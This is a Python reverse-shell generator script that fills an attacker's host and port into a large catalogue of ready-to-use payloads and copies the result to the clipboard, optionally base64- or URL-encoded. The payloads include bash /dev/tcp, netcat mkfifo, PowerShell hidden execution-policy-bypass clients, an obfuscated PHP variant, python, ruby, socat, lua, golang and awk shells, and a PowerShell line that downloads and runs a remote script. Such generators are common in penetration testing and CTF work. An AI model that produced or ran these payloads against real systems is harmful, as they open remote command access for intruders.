#!/usr/bin/env python3
import argparse
from base64 import b64encode
from importlib.util import find_spec
from urllib.parse import quote
from psutil import net_if_addrs
from sys import argv
from pyperclip import copy

requirements = ("pyperclip","psutil")
for library in requirements:
    if not find_spec(library):
        print(f"[!] Looks like you don't have {library} installed.\npip3 install {library}")
        exit(0)

available_shells = '| BASH | SH | NC | NCAT | RUSTCAT | PERL | PHP | WINDOWS | POWERSHELL | PYTHON | RUBY | SOCAT | NODEJS | TELNET | ZSH | LUA | GOLANG | AWK |'

def usage():
    global available_shells
    print("\n[!] Args with a '*' are optional")
    print(f"Usage: python3 {argv[0]} -s <shell-type> -lh <lhost> -lp* <lport> -enc*  <encode-type>\n\nAvailable shells:")
    print(available_shells+"\n")
    print("To list available revshells add =list")
    print(f"E.g => python3 {argv[0]} --shell netcat=list\n")

parser = argparse.ArgumentParser(usage=argparse.SUPPRESS,add_help=False)
parser.add_argument('-lh','--lhost',metavar='')
parser.add_argument('-lp','--lport',metavar='')
parser.add_argument('-s','--shell',metavar='')
parser.add_argument('-enc','--encode',metavar='')
parser.add_argument('-h','--help',action='store_true')
parser.add_argument('-list','--list',metavar='')
parser.add_argument('-listall','--listall',action='store_true')
args = parser.parse_args()

if args.help or len(argv) == 1:
    usage()
    exit(0)

def results(revshell):
    print("[Shell name] -",subgroup)
    print("Your shell =>",revshell)
    copy(revshell)
    print("[!]Copied to clipboard")

def encodingTable(command):
    if encode == 'b64' or encode == 'base64':
        return b64encode(command.encode()).decode()
    elif encode == 'url':
        return quote(command,safe='')
    else:
        print("[!] Wrong type of encode. Available encodes => | base64 | url |")
        exit(0)

def craftingTable(shell):
    global subgroup
    if subgroup:
        user_shell = shells[shell][subgroup].replace('LHOST',lhost).replace('LPORT',lport).strip()
        if encode:
            encoded_user_shell = encodingTable(user_shell)
            results(encoded_user_shell)
            return
        results(user_shell)
        return
    opt = 0 
    for i in shells[shell]:
        print(opt,"=>",shells[shell][i].replace("LHOST",lhost).replace("LPORT",lport).strip())
        opt+=1
    opt = int(input("Choice: "))
    idk = 0
    for i in shells[shell]:
        if idk == opt:
            if encode:
                user_shell = encodingTable(shells[shell][i].replace("LHOST",lhost).replace("LPORT",lport).strip())
                subgroup=i
            else:
                user_shell = shells[shell][i].replace("LHOST",lhost).replace("LPORT",lport).strip()
                subgroup=i
            results(user_shell)
            return
        idk+=1

shells = {
    'bash':{
        'gurgui':''' bash -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
        '196':''' 0<&196;exec 196<>/dev/tcp/LHOST/LPORT; bash <&196 >&196 2>&196 ''',
        'read line':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
        '5':''' bash -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5 ''',
        'udp':''' bash -i >& /dev/udp/LHOST/LPORT 0>&1 '''
    },
    'sh':{
        'gurgui':''' sh -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
        '196':''' 0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196 ''',
        'read line':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
        '5':''' sh -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5 ''',
        'udp':''' sh -i >& /dev/udp/LHOST/LPORT 0>&1 '''
    },
    'nc':{
        'mkfifo':''' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f ''',
        '-e':''' nc -e sh LHOST LPORT ''',
        'exe':''' nc.exe -e sh LHOST LPORT ''',
        '-c':''' nc -c sh LHOST LPORT ''',
    },
    'ncat':{
        '-e':''' ncat LHOST LPORT -e sh ''',
        'exe':''' ncat.exe LHOST LPORT -e sh ''',
        'udp':''' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u LHOST LPORT >/tmp/f '''
    },
    'rustcat':{
        '-r':''' rcat LHOST LPORT -r sh '''
    },
    'perl':{
        '-e':''' perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};' ''',
        'no_sh':''' perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' '''
    },
    'php':{
        'emoji':''' php -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "localhost";$ð» = LPORT;$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' ''',
        'exec':''' php -r '$sock=fsockopen("LHOST",LPORT);exec("sh <&3 >&3 2>&3");' ''',
        'shell_exec':''' php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("sh <&3 >&3 2>&3");' ''',
        'system':''' php -r '$sock=fsockopen("LHOST",LPORT);system("sh <&3 >&3 2>&3");' ''',
        'passthru': ''' php -r '$sock=fsockopen("LHOST",LPORT);passthru("sh <&3 >&3 2>&3");' ''',
        'idk':''' php -r '$sock=fsockopen("LHOST",LPORT);`sh <&3 >&3 2>&3`;' ''',
        'popen':''' php -r '$sock=fsockopen("LHOST",LPORT);popen("sh <&3 >&3 2>&3", "r");' ''',
        'proc_open':''' php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' '''
    },
    'windows':{
        'conpty':''' IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST LPORT '''
    },
    'powershell':{
        '1':''' powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() ''',
        '2':''' powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" ''',
        '3':''' powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('LHOST', LPORT);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" '''
    },
    'python':{
        '1':''' export RHOST="LHOST";export RPORT=LPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',
        '2':''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ''',
        '3':''' export RHOST="LHOST";export RPORT=LPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',
        '4':''' python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ''',
        'short':''' python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")' ''',
        'system-nc':''' python3 -c 'import os; os.system("nc -e /bin/sh LHOST LPORT")' '''
    },
    'ruby':{
        '1':''' ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("LHOST",LPORT))' ''',
        'no sh':''' ruby -rsocket -e'exit if fork;c=TCPSocket.new("LHOST","LPORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}' '''
    },
    'socat':{
        'basic':''' socat TCP:LHOST:LPORT EXEC:sh ''',
        'tty':''' socat TCP:LHOST:LPORT EXEC:'sh',pty,stderr,setsid,sigint,sane '''
    },
    'nodejs':{
        'require':''' require('child_process').exec('nc -e sh LHOST LPORT') '''
    },
    'telnet':{
        'basic':''' TF=$(mktemp -u);mkfifo $TF && telnet LHOST LPORT 0<$TF | sh 1>$TF '''
    },
    'zsh':{
        'basic': ''' zsh -c 'zmodload zsh/net/tcp && ztcp LHOST LPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' '''
    },
    'lua':{
        '1':''' lua -e "require('socket');require('os');t=socket.tcp();t:connect('LHOST','LPORT');os.execute('sh -i <&3 >&3 2>&3');" ''',
        '2':''' lua5.1 -e 'local host, port = "LHOST", LPORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' '''
    },
    'golang':{
        '1':''' echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","LHOST:LPORT");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go '''
    },
    'awk':{
        '1':''' awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''
    }
}
# List given shell type if --list flag supplied
if args.list:
    for i in shells[args.list]:
        print(f'==> {i}')
        print(shells[args.list][i]+"\n")
    exit(0)

# List all available shells if --listalll flag supplied
if args.listall:
    for i in shells:
        print(f"==> {i}\n")
        for x in shells[i]:
            print(f"{x} ~ {shells[i][x]}")
        print("\n")    
    exit(0)

# Shell must be given
if not args.shell:
    print("[!] Shell type must be given")
    exit(0) 

# Lhost must be given
if not args.lhost:
    print("[!] Lhost must be specified")
    exit(0)

# Get ip from the interface or use user input
try:
    lhost = net_if_addrs()[args.lhost][0].address
except:
    lhost = args.lhost

# Make shell lowercase to avoid case problems
shell = args.shell.lower()

# Makes netcat nc so user don't have to remember if it was nc or netcat
if "netcat" in shell:
    shell = shell.replace("netcat","nc")
subgroup = None

# 
if "=" in shell:
    subgroup = shell.split("=")[1]
    shell = shell.split("=")[0]

# Check if shell is in available shells
if shell.upper() not in available_shells:
    print(f"[!] There isn't a shell called {shell}\nAvailable shells: {available_shells}")
    exit(0)

# Check if specific shell name exists
try:
    shells[shell][subgroup]
except:
    print(f"[-]Name {subgroup} not found in {shell} shells")
    exit(0)

# Make lport user choice or 4444 by default
lport = args.lport if args.lport else '4444'

# Make encode user choice or None by default
encode = args.encode if args.encode else None

# Craft the rshell
craftingTable(shell)